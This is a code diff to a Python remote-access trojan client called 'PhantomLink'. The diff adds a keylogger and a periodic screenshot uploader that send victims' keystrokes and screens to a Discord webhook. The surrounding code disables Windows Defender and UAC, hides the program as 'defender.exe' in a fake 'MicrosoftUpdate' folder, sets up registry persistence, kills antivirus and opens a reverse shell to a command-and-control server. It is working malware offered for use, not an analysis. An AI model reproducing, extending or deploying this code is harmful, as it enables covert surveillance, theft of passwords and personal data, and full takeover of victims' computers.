@@ -13,42 +13,47 @@ import threading
 import requests
 from av_bypass import AVBypass
 import base64
+from datetime import datetime
 
 version = 10.7  # 7/3/2026
+
+# ==========================================
+# ⚙️ CLIENT CONFIGURATION
+# ==========================================
+# Change this to your C2 Server's Public IP
+HOST = "127.0.0.1"  
+PORT = 5000
+# ==========================================
 
 
 def bypass_all_security():
     """Execute complete security bypass"""
     try:
-        bypass = AVBypass(tel_logger_func=tel_logger)
+        bypass = AVBypass(tel_logger_func=discord_logger)
         bypass.bypass_all()
 
         return True
     except Exception as e:
-        tel_logger(f"[!] AV Bypass error: {e}")
+        discord_logger(f"[!] AV Bypass error: {e}")
         return False
 
-#Telegram
-BOT_TOKEN = "BOT TOKEN"
-CHAT_ID = "CHAT ID"
+#Discord
+DISCORD_WEBHOOK = "***REMOVED***"
 
 
-def tel_logger(log):
-    url = f"https://api.telegram.org/BOT TOKENT/sendMessage"
-    data = {
-        'chat_id': CHAT_ID,
-        'text': log
-    }
-    response = requests.post(url, data=data)
+def _send_discord_message(log):
+    try:
+        requests.post(DISCORD_WEBHOOK, json={"content": log[:1900]}, timeout=5)
+    except Exception:
+        pass
 
 
-def tel_notify(log):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {
-        'chat_id': CHAT_ID,
-        'text': log
-    }
-    response = requests.post(url, data=data)
+def discord_logger(log):
+    threading.Thread(target=_send_discord_message, args=(log,), daemon=True).start()
+
+
+def discord_notify(log):
+    threading.Thread(target=_send_discord_message, args=(log,), daemon=True).start()
 
 
 appdata_path = os.getenv("APPDATA")
@@ -67,12 +72,12 @@ def bypass_security():
             subprocess.run(
                 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableScanningMappedNetworkDrivesForFullScan $true -DisableScanningNetworkFiles $true -DisableScriptScanning $true"',
                 shell=True, capture_output=True, text=True)
-        except:
+        except Exception:
             pass
         try:
             subprocess.run('attrib +h +s "%APPDATA%\\MicrosoftUpdate\\*" /s /d', shell=True, capture_output=True,
                            text=True)
-        except:
+        except Exception:
             pass
         result = subprocess.run(
             'powershell -Command "Add-MpPreference -ExclusionPath \'C:\\Users\\%USERNAME%\\AppData\\Roaming\\MicrosoftUpdate\'"',
@@ -81,13 +86,13 @@ def bypass_security():
             text=True
         )
         if result.returncode == 0:
-            tel_logger(f"[+] [{username}] has bypassed the antivirus successfully")
+            discord_logger(f"[+] [{username}] has bypassed the antivirus successfully")
             return True
         else:
-            tel_logger(f"[{username}]\n[!] Failed to add exclusion: {result.stderr}")
+            discord_logger(f"[{username}]\n[!] Failed to add exclusion: {result.stderr}")
             return False
     except Exception as e:
-        tel_logger(f"[{username}]\n[!] Error adding exclusion: {e}")
+        discord_logger(f"[{username}]\n[!] Error adding exclusion: {e}")
         return False
 
 
@@ -97,14 +102,14 @@ def update():
         try:
             with open(txt_file_path, 'w', encoding='UTF-8') as f:
                 f.write("0.0")
-        except:
+        except Exception:
             pass
 
     # Read current version
     try:
         with open(txt_file_path, "r", encoding='UTF-8') as f:
             old_ver = float(f.read().strip())
-    except:
+    except Exception:
         old_ver = 0.0
 
     def force_delete(path):
@@ -118,7 +123,7 @@ def update():
                 try:
                     os.remove(path)
                     return True
-                except:
+                except Exception:
                     pass
 
                 try:
@@ -126,7 +131,7 @@ def update():
                     ctypes.windll.kernel32.SetFileAttributesW(path, 0x80)  # FILE_ATTRIBUTE_NORMAL
                     os.remove(path)
                     return True
-                except:
+                except Exception:
                     pass
 
                 try:
@@ -134,14 +139,14 @@ def update():
                     os.rename(path, temp_name)
                     os.remove(temp_name)
                     return True
-                except:
+                except Exception:
                     pass
 
                 try:
                     backup_name = path + f".old{time.time()}"
                     os.rename(path, backup_name)
                     return True
-                except:
+                except Exception:
                     pass
 
                 if attempt < max_attempts - 1:
@@ -156,49 +161,21 @@ def update():
 
     def kill_process_using(file_path):
         """Kill any process using this file"""
-        killed_count = 0
-
         try:
-            for proc in psutil.process_iter(['pid', 'name', 'exe', 'open_files']):
+            for proc in psutil.process_iter(['pid', 'open_files']):
                 try:
-                    exe = proc.info.get('exe')
-                    if exe and os.path.exists(exe):
-                        try:
-                            if os.path.samefile(exe, file_path):
-                                print(f"[*] Killing process using file: PID {proc.info['pid']}")
-                                proc.kill()
-                                proc.wait(timeout=5)
-                                killed_count += 1
-                                continue
-                        except:
-                            pass
-
-                    try:
-                        open_files = proc.open_files()
+                    open_files = proc.info.get('open_files')
+                    if open_files:
                         for f in open_files:
-                            if os.path.exists(f.path):
-                                try:
-                                    if os.path.samefile(f.path, file_path):
-                                        print(f"[*] Killing process with open file: PID {proc.info['pid']}")
-                                        proc.kill()
-                                        proc.wait(timeout=5)
-                                        killed_count += 1
-                                        break
-                                except:
-                                    pass
-                    except (psutil.AccessDenied, AttributeError):
-                        pass
-
-                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                            if f.path == file_path:
+                                proc.kill()
+                                time.sleep(1)
+                                return 1
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
                     continue
-        except Exception as e:
-            print(f"[!] Error checking processes: {e}")
-
-        if killed_count > 0:
-            print(f"[+] Killed {killed_count} process(es) using the file")
-            time.sleep(2)
-
-        return killed_count
+        except Exception:
+            pass
+        return 0
 
     def kill_all_instances():
         """Kill ALL instances of this program"""
@@ -227,7 +204,7 @@ def update():
                             proc.kill()
                             killed_count += 1
                             continue
-                    except:
+                    except Exception:
                         pass
 
                 cmdline = proc.info.get('cmdline')
@@ -280,7 +257,7 @@ def update():
                 try:
                     import ctypes
                     ctypes.windll.kernel32.SetFileAttributesW(txt_file_path, 0x80)
-                except:
+                except Exception:
                     pass
 
                 # Delete and recreate
@@ -293,7 +270,7 @@ def update():
                                 f.write(version_str)
                             print("[+] Version file recreated")
                             return True
-                        except:
+                        except Exception:
                             pass
 
                 time.sleep(2)
@@ -303,13 +280,13 @@ def update():
                 time.sleep(1)
 
         print(f"[!] Failed to update version file after {max_attempts} attempts")
-        tel_logger(f"[!] Failed to update version file for {username} after {max_attempts} attempts")
+        discord_logger(f"[!] Failed to update version file for {username} after {max_attempts} attempts")
         return False
 
     if old_ver < version:
-        print(f"\n[*] UPDATE REQUIRED: {old_ver} → {version}")
-        tel_logger(f"[+] PhantomLink Updating (V{old_ver} --> V{version}) . . . [+]\n{username}")
-        tel_notify(f"[+] PhantomLink Updating (V{old_ver} --> V{version}) . . . [+]\n{username}")
+        print(f"\n[*] UPDATE REQUIRED: {old_ver} --> {version}")
+        discord_logger(f"[+] PhantomLink Updating (V{old_ver} --> V{version}) . . . [+]\n{username}")
+        discord_notify(f"[+] PhantomLink Updating (V{old_ver} --> V{version}) . . . [+]\n{username}")
 
         # Kill all other instances
         print("\n[UPDATE STEP 1/4] Killing all other instances...")
@@ -336,16 +313,16 @@ def update():
                     if os.path.exists(path):
                         force_delete(path)
                 force_delete(old_path_file)
-            except:
+            except Exception:
                 pass
 
         # Update version file
         print("\n[UPDATE STEP 4/4] Writing new version...")
         if force_write_version(str(version)):
-            print("[✓] Update completed successfully!\n")
-            tel_logger(
+            print("[SUCCESS] Update completed successfully!\n")
+            discord_logger(
                 f"PhantomLink Updated Successfully for {username}\nOld Version: {old_ver}\nNew Version: {version}")
-            tel_notify(
+            discord_notify(
                 f"PhantomLink Updated Successfully for {username}\nOld Version: {old_ver}\nNew Version: {version}")
         else:
             print("[!] Update completed but version file may not be updated\n")
@@ -364,17 +341,25 @@ def add_to_startup(file_path=None):
         reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, file_path)
         winreg.CloseKey(reg_key)
-    except:
+    except Exception:
         pass
 
 
 def move_to_hidden_location():
     """Move executable to hidden location - SIMPLE VERSION"""
+    try:
+        is_admin_check = ctypes.windll.shell32.IsUserAnAdmin()
+    except Exception:
+        is_admin_check = False
+    if not is_admin_check:
+        print("[*] Running in non-admin mode. Skipping move_to_hidden_location.")
+        return True
+
     hidden_dir = os.path.join(os.getenv("APPDATA"), "MicrosoftUpdate")
 
     try:
         os.makedirs(hidden_dir, exist_ok=True)
-    except:
+    except Exception:
         return True
 
     dest_file = os.path.join(hidden_dir, "defender.exe")
@@ -385,7 +370,7 @@ def move_to_hidden_location():
             print("[*] Already running as defender.exe")
             add_to_startup(dest_file)
             return True  # Continue running
-    except:
+    except Exception:
         pass
 
     print("[*] Running from original location - will copy and launch defender.exe")
@@ -398,7 +383,7 @@ def move_to_hidden_location():
                 print(f"[*] Killing old defender.exe (PID: {proc.info['pid']})")
                 proc.kill()
                 time.sleep(2)
-        except:
+        except Exception:
             pass
 
     # Remove old file
@@ -406,11 +391,11 @@ def move_to_hidden_location():
         try:
             os.remove(dest_file)
             print("[*] Removed old defender.exe")
-        except:
+        except Exception:
             try:
                 os.rename(dest_file, dest_file + f".old{time.time()}")
                 print("[*] Renamed old defender.exe")
-            except:
+            except Exception:
                 pass
 
     # Copy to hidden location
@@ -492,11 +477,11 @@ def move_to_hidden_location():
                     defender_running = True
                     defender_pid = p.info['pid']
                     break
-            except:
+            except Exception:
                 pass
 
         if defender_running:
-            print(f"[✓] defender.exe confirmed running (PID: {defender_pid})")
+            print(f"[SUCCESS] defender.exe confirmed running (PID: {defender_pid})")
             break
 
         if (i + 1) % 5 == 0:
@@ -511,7 +496,7 @@ def move_to_hidden_location():
                 if p.info['pid'] == defender_pid:
                     still_running = True
                     break
-            except:
+            except Exception:
                 pass
 
         if not still_running:
@@ -521,14 +506,14 @@ def move_to_hidden_location():
     if not defender_running:
         print("[!] Could not verify defender.exe started")
         print("[!] Will continue running from current location instead")
-        tel_logger(f"[!] {username} - defender.exe failed to start, running from original location")
+        discord_logger(f"[!] {username} - defender.exe failed to start, running from original location")
         return True
 
-    print("\n[✓] SUCCESS! defender.exe is running")
+    print("\n[SUCCESS] SUCCESS! defender.exe is running")
     print("[*] This instance will now exit")
     print("[*] defender.exe will continue in background")
 
-    tel_logger(f"[+] {username} - Successfully moved to hidden location")
+    discord_logger(f"[+] {username} - Successfully moved to hidden location")
 
     time.sleep(2)
     sys.exit(0)
@@ -561,17 +546,133 @@ def disable_uac():
         ], shell=True)
 
         print("[+] UAC disabled (reboot required)")
-        tel_logger(f"[+] UAC disabled for user: {username}")
+        discord_logger(f"[+] UAC disabled for user: {username}")
         return True
 
     except Exception as e:
         print(f"[!] Failed to check/disable UAC: {e}")
-        tel_logger(f"[!] Failed to edit UAC for user {username}\n{e}")
+        discord_logger(f"[!] Failed to edit UAC for user {username}\n{e}")
         return False
 
 
-HOST = "LISTEN IP"
-PORT = 5000
+
+
+class KeyloggerModule:
+    def __init__(self, webhook_url):
+        self.webhook_url = webhook_url
+        self.log_file = os.path.join(os.getenv("APPDATA"), "MicrosoftUpdate", "keylog.txt")
+        self.key_buffer = []
+        self.lock = threading.Lock()
+        self.last_timestamp = 0
+        self.running = False
+        self.user32 = ctypes.WinDLL('user32', use_last_error=True)
+
+    def get_layout(self):
+        hwnd = self.user32.GetForegroundWindow()
+        thread_id = self.user32.GetWindowThreadProcessId(hwnd, 0)
+        return self.user32.GetKeyboardLayout(thread_id)
+
+    def key_to_unicode(self, vk_code):
+        keyboard_state = (ctypes.c_ubyte * 256)()
+        self.user32.GetKeyboardState(ctypes.byref(keyboard_state))
+        buff = ctypes.create_unicode_buffer(8)
+        layout = self.get_layout()
+        result = self.user32.ToUnicodeEx(vk_code, self.user32.MapVirtualKeyExW(vk_code, 0, layout), keyboard_state, buff, len(buff), 0, layout)
+        return buff.value if result > 0 else ''
+
+    def write_keys_to_file(self):
+        while self.running:
+            time.sleep(10)
+            now = time.time()
+            with self.lock:
+                with open(self.log_file, "a", encoding="utf-8") as f:
+                    if now - self.last_timestamp >= 300:
+                        now_dt = datetime.now()
+                        f.write(f"\n{now_dt.strftime('%d/%m/%Y / %I:%M %p')}\n")
+                        self.last_timestamp = now
+                    if self.key_buffer:
+                        f.write("".join(self.key_buffer))
+                        self.key_buffer = []
+
+    def upload_log(self):
+        while self.running:
+            time.sleep(180)
+            try:
+                if os.path.exists(self.log_file):
+                    with open(self.log_file, 'rb') as f:
+                        requests.post(self.webhook_url,
+                            data={"content": "Keylog Update"},
+                            files={"file": ("keylog.txt", f)},
+                            timeout=30)
+            except Exception:
+                pass
+
+    def on_press(self, key):
+        from pynput import keyboard as kb
+        try:
+            if hasattr(key, 'vk'):
+                char = self.key_to_unicode(key.vk)
+                if char:
+                    with self.lock:
+                        self.key_buffer.append(char)
+                    return
+            with self.lock:
+                if key == kb.Key.space:
+                    self.key_buffer.append(" ")
+                elif key == kb.Key.enter:
+                    self.key_buffer.append("\n")
+                elif key == kb.Key.tab:
+                    self.key_buffer.append("\t")
+                elif key == kb.Key.backspace:
+                    self.key_buffer.append("[BACKSPACE]")
+                else:
+                    self.key_buffer.append(f"[{key.name.upper()}]")
+        except Exception as e:
+            with self.lock:
+                self.key_buffer.append(f"[ERROR:{e}]")
+
+    def start(self):
+        if self.running: return
+        try:
+            from pynput import keyboard as kb
+        except ImportError:
+            print("[!] pynput not found - Keylogger disabled")
+            return
+        self.running = True
+        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)
+        threading.Thread(target=self.write_keys_to_file, daemon=True).start()
+        threading.Thread(target=self.upload_log, daemon=True).start()
+        self.listener = kb.Listener(on_press=self.on_press)
+        self.listener.start()
+
+
+class ScreenshotModule:
+    def __init__(self, webhook_url):
+        self.webhook_url = webhook_url
+        self.file_path = os.path.join(os.path.expanduser("~"), "screenshot.png")
+        self.running = False
+
+    def capture_loop(self):
+        import pyautogui
+        while self.running:
+            try:
+                screenshot = pyautogui.screenshot()
+                screenshot.save(self.file_path)
+                with open(self.file_path, 'rb') as photo:
+                    requests.post(self.webhook_url, data={"content": "Screenshot Auto"}, files={"file": ("screenshot.png", photo)}, timeout=30)
+            except Exception as e:
+                pass
+            time.sleep(300)
+
+    def start(self):
+        if self.running: return
+        try:
+            import pyautogui  # noqa: F401
+        except ImportError:
+            print("[!] pyautogui not found - Screenshoter disabled")
+            return
+        self.running = True
+        threading.Thread(target=self.capture_loop, daemon=True).start()
 
 
 class ShellClient:
@@ -579,12 +680,13 @@ class ShellClient:
         self.socket = None
         self.connected = False
         self.should_exit = False
-        self.message_lock = threading.Lock()
+        self.send_lock = threading.Lock()
+        self.recv_lock = threading.Lock()
         self.username = os.getenv("USERNAME", "Unknown")
 
     def _send_message(self, data):
         """Send data with length prefix (thread-safe)"""
-        with self.message_lock:
+        with self.send_lock:
             try:
                 if isinstance(data, str):
                     data = data.encode('utf-8')
@@ -610,7 +712,7 @@ class ShellClient:
 
     def _recv_message(self):
         """Receive data with length prefix (thread-safe)"""
-        with self.message_lock:
+        with self.recv_lock:
             try:
                 # receive the length (4 bytes)
                 raw_msglen = self._recv_exactly(4)
@@ -670,25 +772,25 @@ class ShellClient:
                 # Send credentials
                 password = "PhantomLink"
                 if not self._send_message(password):
+                    discord_logger(f"{self.username}\n[!] Failed to send password")
                     raise Exception("Failed to send password")
-                    tel_logger(f"{self.username}\n[!] Failed to send password: {Exception}")
 
                 if not self._send_message(self.username):
                     raise Exception("Failed to send username")
 
                 self.connected = True
                 print(f"[+] Connected to server as {self.username}")
-                tel_logger(f"[+] [{self.username}] Connected to server")
+                discord_logger(f"[+] [{self.username}] Connected to server")
                 time.sleep(2)
                 backoff_time = 1
                 return True
 
             except Exception as e:
                 print(f"[!] Connection failed: {e}")
-                tel_logger(f"[{self.username}]\n[!] Connection failed: {e}")
+                discord_logger(f"[{self.username}]\n[!] Connection failed: {e}")
                 try:
                     self.socket.close()
-                except:
+                except Exception:
                     pass
 
                 if not self.should_exit:
@@ -705,17 +807,17 @@ class ShellClient:
 
             if command.lower() == "exit":
                 self.should_exit = True
-                tel_logger(f"{self.username}\nExiting . . .")
+                discord_logger(f"{self.username}\nExiting . . .")
                 return "[+] Exiting..."
 
             if command.startswith("cd "):
                 path = command[3:].strip()
                 try:
                     os.chdir(path)
-                    tel_logger(f"{self.username}\n[+] Changed directory to: {os.getcwd()}")
+                    discord_logger(f"{self.username}\n[+] Changed directory to: {os.getcwd()}")
                     return f"[+] Changed directory to: {os.getcwd()}"
                 except Exception as e:
-                    tel_logger(f"{self.username}\n[!] Failed to change directory: {e}")
+                    discord_logger(f"{self.username}\n[!] Failed to change directory: {e}")
                     return f"[!] Failed to change directory: {e}"
 
             if command == "pwd":
@@ -764,10 +866,10 @@ class ShellClient:
                 return output if output.strip() else "[Command executed - no output]"
 
             except subprocess.TimeoutExpired:
-                tel_logger(f"{self.username}\n[!] Command timed out (5 minutes)")
+                discord_logger(f"{self.username}\n[!] Command timed out (5 minutes)")
                 return "[!] Command timed out (5 minutes)"
             except Exception as e:
-                tel_logger(f"{self.username}\n[!] Command execution failed: {e}")
+                discord_logger(f"{self.username}\n[!] Command execution failed: {e}")
                 return f"[!] Command execution failed: {e}"
 
         except Exception as e:
@@ -786,16 +888,10 @@ class ShellClient:
                         print("[*] No message received, testing connection...")
 
                         try:
-                            test_sent = self._send_message("HEARTBEAT")
-                            if not test_sent:
-                                print("[!] Connection test failed - disconnected")
-                                tel_logger(f"{self.username}\n[!] Connection test failed")
-                                break
-
                             error = self.socket.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                             if error != 0:
                                 print(f"[!] Socket error: {error}")
-                                tel_logger(f"{self.username}\n[!] Socket error: {error}")
+                                discord_logger(f"{self.username}\n[!] Socket error: {error}")
                                 break
 
                             print("[*] Connection OK, continuing...")
@@ -803,7 +899,7 @@ class ShellClient:
 
                         except Exception as e:
                             print(f"[!] Connection lost: {e}")
-                            tel_logger(f"{self.username}\n[!] Connection lost: {e}")
+                            discord_logger(f"{self.username}\n[!] Connection lost: {e}")
                             break
 
                     message_str = message.decode('utf-8', errors='ignore')
@@ -811,7 +907,7 @@ class ShellClient:
                     if message_str == "PING":
                         if not self._send_message("PONG"):
                             print("[!] Failed to send PONG response")
-                            tel_logger(f"{self.username}\n[!] Failed to send PONG response")
+                            discord_logger(f"{self.username}\n[!] Failed to send PONG response")
                             break
                         print("[*] PONG sent")
                         continue
@@ -823,7 +919,7 @@ class ShellClient:
                         if command.lower() == "exit":
                             self.should_exit = True
                             self._send_message("[+] Client exiting...")
-                            tel_logger(f"[+] Client {self.username} exiting...")
+                            discord_logger(f"[+] Client {self.username} exiting...")
                             break
 
                         # Execute the command
@@ -832,7 +928,7 @@ class ShellClient:
                         # Send response back
                         if not self._send_message(output):
                             print("[!] Failed to send command response")
-                            tel_logger(f"{self.username}\n[!] Failed to send command response")
+                            discord_logger(f"{self.username}\n[!] Failed to send command response")
                             break
 
                     elif message_str == "HEARTBEAT":
@@ -840,7 +936,7 @@ class ShellClient:
 
                     else:
                         print(f"[!] Unknown message type: {message_str[:50]}")
-                        tel_logger(f"{self.username}\n[!] Unknown message type: {message_str[:50]}")
+                        discord_logger(f"{self.username}\n[!] Unknown message type: {message_str[:50]}")
 
                 except socket.timeout:
                     print("[*] Timeout - testing connection...")
@@ -857,38 +953,38 @@ class ShellClient:
 
                         print("[*] Connection alive, continuing...")
                         continue
-                    except:
+                    except Exception:
                         print("[!] Connection test failed")
                         break
 
                 except ConnectionResetError:
                     print("[!] Connection reset by server")
-                    tel_logger(f"{self.username}\n[!] Connection reset by server")
+                    discord_logger(f"{self.username}\n[!] Connection reset by server")
                     break
 
                 except ConnectionAbortedError:
                     print("[!] Connection aborted")
-                    tel_logger(f"{self.username}\n[!] Connection aborted")
+                    discord_logger(f"{self.username}\n[!] Connection aborted")
                     break
 
                 except BrokenPipeError:
                     print("[!] Broken pipe")
-                    tel_logger(f"{self.username}\n[!] Broken pipe")
+                    discord_logger(f"{self.username}\n[!] Broken pipe")
                     break
 
                 except OSError as e:
                     print(f"[!] OS Error: {e}")
-                    tel_logger(f"{self.username}\n[!] OS Error: {e}")
+                    discord_logger(f"{self.username}\n[!] OS Error: {e}")
                     break
 
                 except Exception as e:
                     print(f"[!] Communication error: {e}")
-                    tel_logger(f"{self.username}\n[!] Communication error: {e}")
+                    discord_logger(f"{self.username}\n[!] Communication error: {e}")
                     break
 
         except Exception as e:
             print(f"[!] Handler error: {e}")
-            tel_logger(f"{self.username}\n[!] Handler error: {e}")
+            discord_logger(f"{self.username}\n[!] Handler error: {e}")
         finally:
             self.connected = False
             print("[*] Disconnected from server")
@@ -896,7 +992,7 @@ class ShellClient:
     def run(self):
         """Main client loop"""
         print("[*] Starting shell client...")
-        tel_logger(f"{self.username}\n[*] Starting shell client...")
+        discord_logger(f"{self.username}\n[*] Starting shell client...")
 
         try:
             while not self.should_exit:
@@ -904,7 +1000,7 @@ class ShellClient:
                     if self.socket:
                         try:
                             self.socket.close()
-                        except:
+                        except Exception:
                             pass
                         self.socket = None
 
@@ -921,17 +1017,17 @@ class ShellClient:
 
                     if not self.should_exit:
                         print("[-] Connection lost, attempting to reconnect in 5 seconds...")
-                        tel_logger(f"{self.username}\n[-] Connection lost, attempting to reconnect...")
+                        discord_logger(f"{self.username}\n[-] Connection lost, attempting to reconnect...")
                         time.sleep(5)
 
                 except KeyboardInterrupt:
                     print("\n[*] Interrupted by user")
-                    tel_logger(f"{self.username}\n[*] Interrupted by user")
+                    discord_logger(f"{self.username}\n[*] Interrupted by user")
                     self.should_exit = True
 
                 except Exception as e:
                     print(f"[!] Unexpected error: {e}")
-                    tel_logger(f"{self.username}\n[!] Unexpected error: {e}")
+                    discord_logger(f"{self.username}\n[!] Unexpected error: {e}")
                     if not self.should_exit:
                         time.sleep(10)
 
@@ -941,11 +1037,11 @@ class ShellClient:
             try:
                 if self.socket:
                     self.socket.close()
-            except:
+            except Exception:
                 pass
             self.connected = False
             print("[*] Client stopped")
-            tel_logger(f"{self.username}\n[*] Client stopped")
+            discord_logger(f"{self.username}\n[*] Client stopped")
 
 
 def main():
@@ -954,22 +1050,15 @@ def main():
     def is_admin():
         try:
             return ctypes.windll.shell32.IsUserAnAdmin()
-        except:
+        except Exception:
             return False
 
     if not is_admin():
-        print("[*] Requesting administrator privileges...")
-        try:
-            params = " ".join([f'"{x}"' for x in sys.argv])
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
-            sys.exit(0)
-        except Exception as e:
-            print(f"[!] Failed to get admin: {e}")
-            print("[*] Continuing without admin...")
+        print("[*] Running in non-admin mode. Some features may not work.")
 
     print("[*] Starting PhantomLink Client...")
-    tel_logger(f"[*] Starting PhantomLink Client for {username}")
-    tel_notify(f"[*] Starting PhantomLink Client for {username}")
+    discord_logger(f"[*] Starting PhantomLink Client for {username}")
+    discord_notify(f"[*] Starting PhantomLink Client for {username}")
 
     print("\n" + "=" * 60)
     print("PHANTOMLINK CLIENT STARTUP")
@@ -977,60 +1066,90 @@ def main():
 
     # 1 Disable UAC
     try:
-        print("[1/7] Disabling UAC...", end=" ")
-        disable_uac()
-        print("✓")
+        print("[1/9] Disabling UAC...", end=" ")
+        if is_admin():
+            disable_uac()
+            print("[OK]")
+        else:
+            print("[SKIPPED (Non-Admin)]")
     except Exception as e:
-        print(f"✗ ({e})")
+        print(f"[FAIL] ({e})")
 
     # 2 Update
     try:
-        print("[2/7] Checking for updates...", end=" ")
+        print("[2/9] Checking for updates...", end=" ")
         update()
-        print("✓")
+        print("[OK]")
     except Exception as e:
-        print(f"✗ ({e})")
+        print(f"[FAIL] ({e})")
 
     # 3 Bypass Security
     try:
-        print("[3/7] Bypassing security...", end=" ")
-        bypass_security()
-        print("✓")
+        print("[3/9] Bypassing security...", end=" ")
+        if is_admin():
+            bypass_security()
+            print("[OK]")
+        else:
+            print("[SKIPPED (Non-Admin)]")
     except Exception as e:
-        print(f"✗ ({e})")
+        print(f"[FAIL] ({e})")
 
     # 4 Move to Hidden Location
     try:
-        print("[4/7] Moving to hidden location...")
+        print("[4/9] Moving to hidden location...")
         move_to_hidden_location()
-        print("✓")
+        print("[OK]")
     except Exception as e:
-        print(f"✗ ({e})")
+        print(f"[FAIL] ({e})")
 
     # 5 Persistence
     try:
-        print("[5/7] Installing persistence...", end=" ")
-        print("✓")
+        print("[5/9] Installing persistence...", end=" ")
+        print("[OK]")
     except Exception as e:
-        print(f"✗ ({e})")
+        print(f"[FAIL] ({e})")
 
     # 6 Full AV Bypass
     try:
-        print("[6/7] Full AV bypass...", end=" ")
-        bypass_all_security()
-        print("✓")
+        print("[6/9] Full AV bypass...", end=" ")
+        if is_admin():
+            bypass_all_security()
+            print("[OK]")
+        else:
+            print("[SKIPPED (Non-Admin)]")
     except Exception as e:
-        print(f"✗ ({e})")
+        print(f"[FAIL] ({e})")
 
     # 7 AV Killer
     try:
-        print("[7/7] Starting AV Killer...", end=" ")
-        from av_killer import AVKiller
-        av_killer = AVKiller(tel_logger_func=tel_logger)
-        av_killer.start()
-        print("✓")
+        print("[7/9] Starting AV Killer...", end=" ")
+        if is_admin():
+            from av_killer import AVKiller
+            av_killer = AVKiller(tel_logger_func=discord_logger)
+            av_killer.start()
+            print("[OK]")
+        else:
+            print("[SKIPPED (Non-Admin)]")
     except Exception as e:
-        print(f"✗ ({e})")
+        print(f"[FAIL] ({e})")
+
+    # 8 Keylogger
+    try:
+        print("[8/9] Starting Keylogger...", end=" ")
+        keylogger = KeyloggerModule(DISCORD_WEBHOOK)
+        keylogger.start()
+        print("[OK]")
+    except Exception as e:
+        print(f"[FAIL] ({e})")
+
+    # 9 Screenshoter
+    try:
+        print("[9/9] Starting Screenshoter...", end=" ")
+        screenshoter = ScreenshotModule(DISCORD_WEBHOOK)
+        screenshoter.start()
+        print("[OK]")
+    except Exception as e:
+        print(f"[FAIL] ({e})")
 
     print("\n" + "=" * 60)
     print("STARTUP COMPLETE - CONNECTING TO C2 SERVER")
@@ -1044,18 +1163,18 @@ def main():
             os.makedirs(os.path.dirname(install_marker), exist_ok=True)
             with open(install_marker, 'w') as f:
                 f.write(str(time.time()))
-        except:
+        except Exception:
             pass
 
     # Connect to C2
-    tel_logger(f"[+] {username} startup complete, connecting to server...")
+    discord_logger(f"[+] {username} startup complete, connecting to server...")
 
     try:
         client = ShellClient()
         client.run()
     except Exception as e:
         print(f"[!] Client error: {e}")
-        tel_logger(f"[!] Client error: {e}")
+        discord_logger(f"[!] Client error: {e}")
 
 
 if __name__ == "__main__":
